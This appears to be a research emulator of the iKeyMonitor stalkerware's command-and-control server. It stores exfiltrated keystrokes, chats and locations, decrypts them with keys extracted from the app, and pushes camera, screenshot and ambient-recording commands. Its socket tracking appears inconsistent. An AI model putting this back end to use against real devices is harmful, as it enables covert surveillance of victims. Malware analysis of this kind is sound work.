"""
iKeyMonitor v17.4 + v19.1 Mock C2 Server
==========================================
Dual-version mock C2 supporting both the typo'd v17.4 endpoints and the corrected v19.1 endpoints.

Channels:
  - REST API (data exfiltration + config) via /index.php?m=api&a={action}
  - WebSocket (real-time commands: Camera, Screenshots, ScreenshotVideo, Surrounding)
  - Admin API (trigger commands, inspect state, crypto tools)

Usage:
    uv sync
    uv run python server.py              # HTTPS :8443, auto-gen cert si absent
    uv run python server.py --http       # HTTP :8080 (debug)
    uv run python server.py --regen-cert # force nouveau cert

Le premier lancement génère cert.pem + key.pem (self-signed, SAN=
127.0.0.1/localhost/10.11.1.1 + les 5 domaines C2 iKeyMonitor, valide 1 an).
Le bypass SSL Frida reste requis côté app.

Research use only — ASTRA/LHS-LORIA stalkerware analysis project.
"""

import argparse
import base64
import hashlib
import ipaddress
import json
import logging
import re
import sys
import time
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

from Crypto.Cipher import DES3
from Crypto.Util.Padding import pad, unpad
from fastapi import FastAPI, Query, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import PlainTextResponse, JSONResponse

# ---------------------------------------------------------------------------
# Self-signed TLS cert — auto-généré au premier lancement
# ---------------------------------------------------------------------------

CERT_PATH = Path(__file__).parent / "cert.pem"
KEY_PATH  = Path(__file__).parent / "key.pem"

# Domaines C2 iKeyMonitor (inclus dans le SAN pour permettre DNS spoofing / hosts)
IKM_C2_DOMAINS = [
    "ikmws.awsapi.io",
    "ikmws-mirror.awsapi.io",
    "ikm-sv2.awsapi.io",
    "ikm-sv3.awsapi.io",
    "ikm-sv4.awsapi.io",
]


def ensure_cert(log_fn=print) -> tuple[Path, Path]:
    """Génère cert.pem + key.pem si absents. Self-signed, SAN multi-IP +
    domaines C2 iKM, valide 1 an. Utilise `cryptography` (pur Python)."""
    if CERT_PATH.exists() and KEY_PATH.exists():
        log_fn(f"🔒 Reusing existing cert: {CERT_PATH.name}")
        return CERT_PATH, KEY_PATH

    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
    except ImportError:
        log_fn("❌ `cryptography` manquant. Ajoute-le dans pyproject.toml :")
        log_fn('     dependencies = ["cryptography>=42", ...]')
        log_fn("   puis : uv sync")
        sys.exit(1)

    log_fn("🔐 Generating self-signed cert (first run)…")

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "FR"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ASTRA LORIA (research)"),
        x509.NameAttribute(NameOID.COMMON_NAME, "ikmws.awsapi.io"),
    ])

    san_entries = [
        x509.DNSName("localhost"),
        x509.DNSName("mock-c2"),
        x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
        x509.IPAddress(ipaddress.IPv4Address("10.11.1.1")),
        x509.IPAddress(ipaddress.IPv4Address("10.0.2.2")),
    ]
    for d in IKM_C2_DOMAINS:
        san_entries.append(x509.DNSName(d))

    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(minutes=5))
        .not_valid_after(now + timedelta(days=365))
        .add_extension(x509.SubjectAlternativeName(san_entries), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, key_encipherment=True,
                content_commitment=False, data_encipherment=False,
                key_agreement=False, key_cert_sign=False, crl_sign=False,
                encipher_only=False, decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )

    CERT_PATH.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    KEY_PATH.write_bytes(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ))

    log_fn(f"   ✅ {CERT_PATH.name} + {KEY_PATH.name} (valid 1y, SAN=127.0.0.1/localhost/10.11.1.1 + {len(IKM_C2_DOMAINS)} domaines C2)")
    return CERT_PATH, KEY_PATH

# ---------------------------------------------------------------------------
# Config — matches values extracted from APK (identical across v17.4 & v19.1)
# ---------------------------------------------------------------------------

TDES_KEY = b"ccc707d2924768f2cc12bc8b"           # 24-byte 3DES key
RTMP_SECRET = "C4hgdA%Qc5UHfqEho&Ke"             # RTMP signing secret
MOCK_UNIT_ID = "MSIK-ONLINE-MOCK001"
MOCK_LICENSE = "MOCK-LICENSE-ASTRA-2026"

LOG_DIR = Path("logs")
UPLOAD_DIR = Path("uploads")
for d in [LOG_DIR, UPLOAD_DIR, UPLOAD_DIR / "photos", UPLOAD_DIR / "screenshots",
          UPLOAD_DIR / "audio", UPLOAD_DIR / "video", UPLOAD_DIR / "chat_img",
          UPLOAD_DIR / "call_img", UPLOAD_DIR / "keystrokes", UPLOAD_DIR / "chats",
          UPLOAD_DIR / "gps", UPLOAD_DIR / "calls", UPLOAD_DIR / "web_history",
          UPLOAD_DIR / "clipboard", UPLOAD_DIR / "contacts", UPLOAD_DIR / "calendar",
          UPLOAD_DIR / "wifi", UPLOAD_DIR / "surrounding", UPLOAD_DIR / "debug",
          UPLOAD_DIR / "crash_logs", UPLOAD_DIR / "misc"]:
    d.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_DIR / "c2.log"),
    ],
)
log = logging.getLogger("ikm-c2")

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------

devices: dict[str, dict] = {}
exfiltrated: list[dict] = []
ws_connections: dict[str, WebSocket] = {}  # client_id -> ws
ws_anon: list[WebSocket] = []              # ws pas encore identifiés
command_queue: list[str] = []

# ---------------------------------------------------------------------------
# Endpoint mapping — v17.4 action → canonical v19.1 action
# ---------------------------------------------------------------------------

ENDPOINT_ALIASES: dict[str, str] = {
    "uoload_keystrokes": "upload_keystrokes",
    "uoload_chat_logs": "upload_chat_logs",
    "uoload_website_history": "upload_website_history",
    "uoload_call_history": "upload_call_history",
    "uoload_gps_history": "upload_gps_history",
    "surrounding": "upload_surrounding",
    "contact": "upload_contact",
    "calendar": "upload_calendar",
    "get_screenshot": "upload_screenshot",
    "upload_Wifi": "upload_wifi",
}

UPLOAD_SUBDIRS: dict[str, str] = {
    "upload_photo": "photos",
    "upload_chat_img": "chat_img",
    "upload_call_img": "call_img",
    "upload_screenvideo": "video",
    "upload_video": "video",
    "upload_surrounding": "surrounding",
    "upload_screenshot": "screenshots",
    "upload_keystrokes": "keystrokes",
    "upload_chat_logs": "chats",
    "upload_website_history": "web_history",
    "upload_call_history": "calls",
    "upload_gps_history": "gps",
    "upload_clipboard": "clipboard",
    "upload_contact": "contacts",
    "upload_calendar": "calendar",
    "upload_wifi": "wifi",
    "upload_debug_logs": "debug",
    "upload_weekly_crash_logs": "crash_logs",
}

# Champs XML à extraire par action canonique
PARSE_FIELDS: dict[str, list[str]] = {
    "upload_keystrokes": ["App", "Text", "Time"],
    "upload_chat_logs": ["App", "Contact", "Message", "Time"],
    "upload_gps_history": ["Lat", "Lon", "Time", "Accuracy"],
    "upload_call_history": ["Number", "Duration", "Time", "Type"],
    "upload_website_history": ["Url", "Title", "Time"],
    "upload_contact": ["Name", "Phone", "Email"],
    "upload_clipboard": ["Text", "Time"],
    "upload_wifi": ["SSID", "BSSID", "Time"],
}

# ---------------------------------------------------------------------------
# 3DES helpers
# ---------------------------------------------------------------------------

def tdes_encrypt(plaintext: str, key: bytes = TDES_KEY) -> str:
    cipher = DES3.new(key, DES3.MODE_ECB)
    ct = cipher.encrypt(pad(plaintext.encode("utf-8"), DES3.block_size))
    return base64.b64encode(ct.hex().encode()).decode()


def tdes_decrypt(b64hex: str, key: bytes = TDES_KEY) -> str:
    raw_hex = base64.b64decode(b64hex).decode()
    ct = bytes.fromhex(raw_hex)
    cipher = DES3.new(key, DES3.MODE_ECB)
    return unpad(cipher.decrypt(ct), DES3.block_size).decode("utf-8")


def try_tdes_decrypt(value: str) -> Optional[str]:
    """Tente un déchiffrement 3DES. Retourne le clair ou None."""
    if not value or len(value) < 4:
        return None
    try:
        return tdes_decrypt(value)
    except Exception:
        return None


def rtmp_sign(device_id: str, sign_ts: str) -> str:
    raw = f"/live/{device_id}-{sign_ts}-{RTMP_SECRET}"
    return hashlib.md5(raw.encode()).hexdigest()

# ---------------------------------------------------------------------------
# XML helpers
# ---------------------------------------------------------------------------

def xml_response(ret: str = "500", client: str = "", extra: str = "") -> str:
    ts = str(int(time.time()))
    return (
        f"<IKMService>"
        f"<Ret>{_xml_escape(ret)}</Ret>"
        f"<Client>{_xml_escape(client)}</Client>"
        f"<UnitID>{MOCK_UNIT_ID}</UnitID>"
        f"<MonitorStatus>0</MonitorStatus>"
        f"<WSTimeStamp>{ts}</WSTimeStamp>"
        f"{extra}"
        f"</IKMService>"
    )


def xml_command(request_type: str, request_id: str, body: str) -> str:
    return (
        f"<IKMService>"
        f"<RequestType>{_xml_escape(request_type)}</RequestType>"
        f"<RequestId>{_xml_escape(request_id)}</RequestId>"
        f"{body}"
        f"</IKMService>"
    )


def _xml_escape(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def parse_xml_field(xml_str: str, tag: str) -> str:
    m = re.search(rf"<{re.escape(tag)}>(.*?)</{re.escape(tag)}>", xml_str, re.DOTALL)
    return m.group(1) if m else ""

# ---------------------------------------------------------------------------
# §1 — Version detection (fiable, basée sur l'alias)
# ---------------------------------------------------------------------------

def detect_version(action_raw: str, canonical: str, client: str) -> str:
    """Détecte la version APK à partir de l'action brute :
    si l'action a été normalisée via un alias → v17.4, sinon v19.1."""
    if client in devices and devices[client].get("version") not in (None, "unknown"):
        return devices[client]["version"]
    if action_raw in ENDPOINT_ALIASES:
        return "v17.4"
    if canonical in HANDLERS:
        return "v19.1"
    return "unknown"

# ---------------------------------------------------------------------------
# §3 — Parse des payloads entrants
# ---------------------------------------------------------------------------

def parse_payload(canonical: str, body_str: str) -> dict:
    """Extrait les champs XML significatifs pour les actions à fort signal."""
    fields = PARSE_FIELDS.get(canonical)
    if not fields:
        return {}
    result = {}
    for f in fields:
        val = parse_xml_field(body_str, f)
        if val:
            result[f] = val
    return result

# ---------------------------------------------------------------------------
# §2 + §4 — Persistence + déchiffrement auto
# ---------------------------------------------------------------------------

async def _save_upload(action: str, canonical: str, request: Request, body: bytes) -> tuple[bytes, str, dict]:
    """Lit le body, persiste, parse, tente le déchiffrement, log."""
    body_str = body.decode("utf-8", errors="replace")
    client = parse_xml_field(body_str, "Client") or "unknown"
    version = detect_version(action, canonical, client)

    parsed = parse_payload(canonical, body_str)

    license_raw = parse_xml_field(body_str, "License")
    license_plain = try_tdes_decrypt(license_raw)
    data_raw = parse_xml_field(body_str, "Data")
    data_plain = try_tdes_decrypt(data_raw)

    ts_ms = int(time.time() * 1000)
    safe_client = re.sub(r"[^a-zA-Z0-9_\-]", "_", client)

    entry = {
        "ts": datetime.now().isoformat(),
        "action_raw": action,
        "action_canonical": canonical,
        "version": version,
        "client": client,
        "ip": request.client.host if request.client else "?",
        "body_len": len(body),
        "body_preview": body_str[:500],
    }
    if parsed:
        entry["parsed"] = parsed
    if license_plain:
        entry["license_plain"] = license_plain
    if data_plain:
        entry["data_plain"] = data_plain

    exfiltrated.append(entry)

    version_tag = f"[{version}]" if version != "unknown" else ""
    log.info(">>> [%s] %sfrom %s (%d bytes) %s",
             canonical,
             f"(raw: {action}) " if action != canonical else "",
             entry["ip"], len(body), version_tag)
    if parsed:
        log.info("    parsed: %s", json.dumps(parsed, ensure_ascii=False))
    if license_plain:
        log.info("    license (decrypted): %s", license_plain)
    if data_plain:
        log.info("    data (decrypted): %s", data_plain[:200])

    # §2 — toujours persister sur disque pour les actions d'upload
    subdir = UPLOAD_SUBDIRS.get(canonical, "misc")
    bin_path = UPLOAD_DIR / subdir / f"{ts_ms}_{safe_client}_{canonical}.bin"
    bin_path.parent.mkdir(parents=True, exist_ok=True)
    bin_path.write_bytes(body)
    log.info("    saved %d bytes -> %s", len(body), bin_path)

    if parsed or license_plain or data_plain:
        json_data = {"body_preview": body_str[:2000]}
        if parsed:
            json_data["parsed"] = parsed
        if license_plain:
            json_data["license_plain"] = license_plain
        if data_plain:
            json_data["data_plain"] = data_plain
        json_path = bin_path.with_suffix(".json")
        json_path.write_text(json.dumps(json_data, indent=2, ensure_ascii=False))

    return body, client, entry


def _track_device(client: str, version: str, canonical: str, license_plain: Optional[str] = None):
    """Crée ou met à jour un device."""
    if client == "unknown":
        return
    now = datetime.now().isoformat()
    if client not in devices:
        devices[client] = {
            "client_id": client,
            "first_seen": now,
            "last_seen": now,
            "version": version,
            "license_plain": None,
            "forced_ret": None,
            "actions": [],
        }
    devices[client]["last_seen"] = now
    devices[client]["actions"].append({"ts": now, "action": canonical})
    if version != "unknown":
        devices[client]["version"] = version
    if license_plain:
        devices[client]["license_plain"] = license_plain


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(title="iKeyMonitor Mock C2", version="3.0.0",
              description="Dual-version: v17.4 + v19.1, full analysis bench")


def _normalize_action(action: str) -> str:
    return ENDPOINT_ALIASES.get(action, action)


# ---------------------------------------------------------------------------
# REST API router
# ---------------------------------------------------------------------------

@app.api_route("/index.php", methods=["GET", "POST"])
async def api_router(request: Request, m: str = Query("api"), a: str = Query("")):
    body = await request.body()
    canonical = _normalize_action(a)

    body_bytes, client, entry = await _save_upload(a, canonical, request, body)
    version = entry.get("version", "unknown")
    license_plain = entry.get("license_plain")

    _track_device(client, version, canonical, license_plain)

    handler = HANDLERS.get(canonical, _handle_generic)
    return await handler(request, body_bytes, entry, client, canonical)


# --- Handlers ---

async def _handle_register(request, body, entry, client, action):
    log.info("REGISTER device: %s", client)
    return PlainTextResponse(xml_response("500", client))


async def _handle_account(request, body, entry, client, action):
    log.info("ACCOUNT check: %s", client)
    return PlainTextResponse(xml_response("500", client))


async def _handle_cycle(request, body, entry, client, action):
    """Heartbeat — §5: dépile command_queue dans la réponse, §7: forced_ret."""
    extra = ""

    # §5 — embarquer les commandes en queue dans la réponse cycle
    queued = []
    remaining = []
    for cmd in command_queue:
        queued.append(cmd)
    command_queue.clear()
    for cmd in queued:
        extra += cmd

    # §7 — code de retour forcé
    ret = "500"
    if client in devices and devices[client].get("forced_ret"):
        ret = devices[client]["forced_ret"]
        devices[client]["forced_ret"] = None
        log.info("CYCLE from %s — forced ret=%s (one-shot)", client, ret)
    else:
        log.info("CYCLE from %s", client)

    return PlainTextResponse(xml_response(ret, client, extra))


async def _handle_get_settings(request, body, entry, client, action):
    log.info("GET_SETTINGS: %s", client)
    settings_xml = (
        "<Settings>"
        "<MonitoringEnabled>1</MonitoringEnabled>"
        "<ScreenshotInterval>300</ScreenshotInterval>"
        "<GpsInterval>300</GpsInterval>"
        "<KeystrokesEnabled>1</KeystrokesEnabled>"
        "<ChatLogsEnabled>1</ChatLogsEnabled>"
        "<CallRecordEnabled>1</CallRecordEnabled>"
        "<SurroundingEnabled>1</SurroundingEnabled>"
        "<WebHistoryEnabled>1</WebHistoryEnabled>"
        "<ClipboardEnabled>1</ClipboardEnabled>"
        "</Settings>"
    )
    return PlainTextResponse(xml_response("500", client, settings_xml))


async def _handle_set_settings(request, body, entry, client, action):
    log.info("SET_SETTINGS from %s", client)
    return PlainTextResponse(xml_response("500", client))


async def _handle_get_websocket_address(request, body, entry, client, action):
    host = request.headers.get("host", "127.0.0.1:8443")
    scheme = "wss" if "https" in str(request.url) else "ws"
    ws_url = f"{scheme}://{host}/ws"
    log.info("WS_ADDRESS requested by %s -> %s", client, ws_url)
    return PlainTextResponse(
        f"<IKMService><Ret>500</Ret><Client>{_xml_escape(client)}</Client>"
        f"<WSAddress>{ws_url}</WSAddress></IKMService>"
    )


async def _handle_check_update(request, body, entry, client, action):
    log.info("CHECK_UPDATE: %s", client)
    return PlainTextResponse(
        f"<IKMService><Ret>500</Ret><Client>{_xml_escape(client)}</Client>"
        f"<UpdateAvailable>0</UpdateAvailable></IKMService>"
    )


async def _handle_upload_data(request, body, entry, client, action):
    log.info("UPLOAD [%s] from %s (%d bytes)", action, client, len(body))
    return PlainTextResponse(xml_response("500", client))


async def _handle_generic(request, body, entry, client, action):
    log.info("UNKNOWN action [%s] from %s", action, client)
    return PlainTextResponse(xml_response("500", client))


HANDLERS = {
    "register": _handle_register,
    "account": _handle_account,
    "cycle": _handle_cycle,
    "get_settings": _handle_get_settings,
    "set_settings": _handle_set_settings,
    "get_websocket_address": _handle_get_websocket_address,
    "check_update": _handle_check_update,
    "download_update": _handle_generic,
    "reset_password": _handle_generic,
    "schedule_surround": _handle_generic,
    "upload_keystrokes": _handle_upload_data,
    "upload_chat_logs": _handle_upload_data,
    "upload_website_history": _handle_upload_data,
    "upload_call_history": _handle_upload_data,
    "upload_gps_history": _handle_upload_data,
    "upload_chat_img": _handle_upload_data,
    "upload_call_img": _handle_upload_data,
    "upload_wifi": _handle_upload_data,
    "upload_clipboard": _handle_upload_data,
    "upload_photo": _handle_upload_data,
    "upload_video": _handle_upload_data,
    "upload_screenvideo": _handle_upload_data,
    "upload_surrounding": _handle_upload_data,
    "upload_contact": _handle_upload_data,
    "upload_calendar": _handle_upload_data,
    "upload_screenshot": _handle_upload_data,
    "upload_debug_logs": _handle_upload_data,
    "upload_weekly_crash_logs": _handle_upload_data,
}


# ---------------------------------------------------------------------------
# §6 — WebSocket avec corrélation par device
# ---------------------------------------------------------------------------

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws.accept()
    ws_client_id: Optional[str] = None
    ws_anon.append(ws)
    log.info("WebSocket connected (anon, total ws: %d)", len(ws_anon) + len(ws_connections))

    on_connect = xml_command("onConnect", "0", "")
    await ws.send_text(on_connect)
    log.info("Sent onConnect handshake")

    try:
        while True:
            data = await ws.receive_text()
            log.info("WS recv: %s", data[:300])

            ret = parse_xml_field(data, "Ret")
            client = parse_xml_field(data, "Client")
            license_key = parse_xml_field(data, "License")
            req_type = parse_xml_field(data, "RequestType")

            if client and client not in devices:
                devices[client] = {
                    "client_id": client,
                    "first_seen": datetime.now().isoformat(),
                    "last_seen": datetime.now().isoformat(),
                    "license": license_key,
                    "version": "unknown",
                    "actions": ["ws_connect"],
                }
            if client and client in devices:
                devices[client]["last_seen"] = datetime.now().isoformat()
                devices[client]["license"] = license_key

            log.info("WS: client=%s license=%s ret=%s type=%s",
                     client, license_key[:20] if license_key else "?", ret, req_type)

            while command_queue:
                cmd = command_queue.pop(0)
                await ws.send_text(cmd)
                log.info("Pushed queued command: %s", cmd[:200])

    except WebSocketDisconnect:
        ws_connections.remove(ws)
        log.info("WebSocket disconnected (remaining: %d)", len(ws_connections))
    except Exception as e:
        if ws in ws_connections:
            ws_connections.remove(ws)
        log.error("WebSocket error: %s", e)


# ---------------------------------------------------------------------------
# Admin API
# ---------------------------------------------------------------------------

@app.get("/admin/status")
async def admin_status():
    return {
        "devices": list(devices.values()),
        "ws_connections": len(ws_connections),
        "exfiltrated_count": len(exfiltrated),
        "command_queue": len(command_queue),
        "supported_versions": ["v17.4", "v19.1"],
    }


@app.get("/admin/exfiltrated")
async def admin_exfiltrated(limit: int = 50):
    return {"count": len(exfiltrated), "data": exfiltrated[-limit:]}


@app.get("/admin/exfiltrated/by_type/{action}")
async def admin_exfiltrated_by_type(action: str, limit: int = 50):
    """Filter exfiltrated data by canonical action name."""
    filtered = [e for e in exfiltrated if e.get("action_canonical") == action]
    return {"count": len(filtered), "data": filtered[-limit:]}


@app.get("/admin/endpoints")
async def admin_endpoints():
    """Show endpoint mapping: v17.4 -> v19.1 canonical names."""
    return {
        "aliases": ENDPOINT_ALIASES,
        "canonical_endpoints": sorted(HANDLERS.keys()),
        "upload_dirs": UPLOAD_SUBDIRS,
    }


@app.post("/admin/cmd/camera")
async def admin_cmd_camera(camera_type: str = "front"):
    req_id = str(int(time.time()))
    cmd = xml_command("camera_snap", req_id,
                      f"<Camera><Enable>1</Enable><Type>{camera_type}</Type></Camera>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send camera cmd: %s", e)
    log.info("Camera command sent (type=%s) to %d connections", camera_type, sent)
    return {"status": "sent", "type": camera_type, "connections": sent}


@app.post("/admin/cmd/screenshot")
async def admin_cmd_screenshot():
    req_id = str(int(time.time()))
    cmd = xml_command("screenshot_snap", req_id,
                      "<Screenshots><Enable>1</Enable></Screenshots>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send screenshot cmd: %s", e)
    log.info("Screenshot command sent to %d connections", sent)
    return {"status": "sent", "connections": sent}


@app.post("/admin/cmd/screenstream")
async def admin_cmd_screenstream(enable: int = 1):
    req_id = str(int(time.time()))
    sign_ts = str(int(time.time()))
    cmd = xml_command("screen_video", req_id,
                      f"<ScreenshotVideo><Enable>{enable}</Enable></ScreenshotVideo>"
                      f"<SignTimeStamp>{sign_ts}</SignTimeStamp>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send screenstream cmd: %s", e)
    log.info("Screen stream command sent (enable=%d) to %d connections", enable, sent)
    return {"status": "sent", "enable": enable, "sign_ts": sign_ts, "connections": sent}


@app.post("/admin/cmd/surrounding")
async def admin_cmd_surrounding(enable: int = 1, duration: int = 60):
    req_id = str(int(time.time()))
    cmd = xml_command("surround_rec", req_id,
                      f"<Surrounding><Enable>{enable}</Enable>"
                      f"<Duration>{duration}</Duration></Surrounding>")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(cmd)
            sent += 1
        except Exception as e:
            log.error("Failed to send surrounding cmd: %s", e)
    log.info("Surrounding command sent (enable=%d, duration=%ds) to %d connections",
             enable, duration, sent)
    return {"status": "sent", "enable": enable, "duration": duration, "connections": sent}


@app.post("/admin/cmd/raw")
async def admin_cmd_raw(request: Request):
    body = await request.body()
    xml_str = body.decode("utf-8")
    sent = 0
    for ws in ws_connections:
        try:
            await ws.send_text(xml_str)
            sent += 1
        except Exception as e:
            log.error("Failed to send raw cmd: %s", e)
    log.info("Raw command sent to %d connections", sent)
    return {"status": "sent", "connections": sent}


# ---------------------------------------------------------------------------
# Crypto admin
# ---------------------------------------------------------------------------

@app.get("/admin/crypto/encrypt")
async def admin_crypto_encrypt(plaintext: str = "test"):
    return {"plaintext": plaintext, "encrypted": tdes_encrypt(plaintext)}


@app.get("/admin/crypto/decrypt")
async def admin_crypto_decrypt(ciphertext: str = ""):
    try:
        return {"ciphertext": ciphertext, "decrypted": tdes_decrypt(ciphertext)}
    except Exception as e:
        return {"error": str(e)}


@app.get("/admin/crypto/rtmp_sign")
async def admin_crypto_rtmp(device_id: str = "test", sign_ts: str = ""):
    if not sign_ts:
        sign_ts = str(int(time.time()))
    sig = rtmp_sign(device_id, sign_ts)
    url = f"rtmp://{{RTMP_SERVER}}/{device_id}?sign={sign_ts}-{sig}"
    return {"device_id": device_id, "sign_ts": sign_ts, "md5": sig, "url": url}


# ---------------------------------------------------------------------------
# Entrypoint — python server.py  (HTTPS auto-gen cert)
#              python server.py --http  (HTTP clair, debug)
# ---------------------------------------------------------------------------

def main() -> None:
    import uvicorn

    parser = argparse.ArgumentParser(description="iKeyMonitor Mock C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Bind host (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8443, help="Bind port (default: 8443 HTTPS, 8080 HTTP)")
    parser.add_argument("--http", action="store_true",
                        help="Serve plain HTTP (no TLS). Bascule le port par défaut à 8080.")
    parser.add_argument("--regen-cert", action="store_true",
                        help="Force regeneration of cert.pem/key.pem even if they exist.")
    args = parser.parse_args()

    if args.http and args.port == 8443:
        args.port = 8080

    banner = "\n" + "═" * 60 + "\n  iKeyMonitor Mock C2 Server v2.0.0 (v17.4 + v19.1)\n" + "═" * 60
    print(banner)

    if args.http:
        print(f"⚠️  HTTP MODE (no TLS) — http://{args.host}:{args.port}/")
        uvicorn.run(app, host=args.host, port=args.port, log_level="info")
        return

    if args.regen_cert:
        for p in (CERT_PATH, KEY_PATH):
            if p.exists():
                p.unlink()
                print(f"🗑️  Removed old {p.name}")

    cert, key = ensure_cert()
    print(f"🔐 HTTPS — https://{args.host}:{args.port}/")
    print(f"   cert: {cert}")
    print(f"   key:  {key}\n")

    uvicorn.run(
        app,
        host=args.host,
        port=args.port,
        ssl_certfile=str(cert),
        ssl_keyfile=str(key),
        log_level="info",
    )


if __name__ == "__main__":
    main()
